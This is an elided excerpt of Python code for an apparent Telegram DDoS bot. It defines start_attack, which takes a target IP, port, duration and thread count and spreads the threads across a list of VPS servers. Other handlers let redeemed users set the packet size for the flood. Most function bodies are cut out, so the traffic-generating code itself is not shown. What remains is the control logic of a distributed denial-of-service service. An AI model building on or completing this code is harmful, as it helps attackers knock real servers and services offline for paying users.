...
def start_attack(message, ip, port, duration, threads, is_public=False):
    ...
    for vps in VPS_LIST[:ACTIVE_VPS_COUNT]:
        if len(vps) >= 3:  # Ensure valid VPS config
            # Distribute threads evenly across all VPS
            vps_threads = threads // ACTIVE_VPS_COUNT
            if len(vps_distribution) < threads % ACTIVE_VPS_COUNT:
                vps_threads += 1
            if vps_threads > 0:
...
def set_packet_size_start(message):
    ...
    bot.reply_to(message,
        f"📦 Enter new packet size (in bytes):\n"
        f"Minimum: {MIN_PACKET_SIZE}\n"
        f"Maximum: {MAX_PACKET_SIZE}\n"
        f"Current: {redeemed_users[user_id].get('packet_size', DEFAULT_PACKET_SIZE)}")
...
def process_packet_size(message):
    ...
    try:
        ...
        bot.reply_to(message, f"✅ Packet size set to {new_size} bytes")
    except:
        bot.reply_to(message, f"❌ Invalid size! Must be between {MIN_PACKET_SIZE} and {MAX_PACKET_SIZE} bytes")
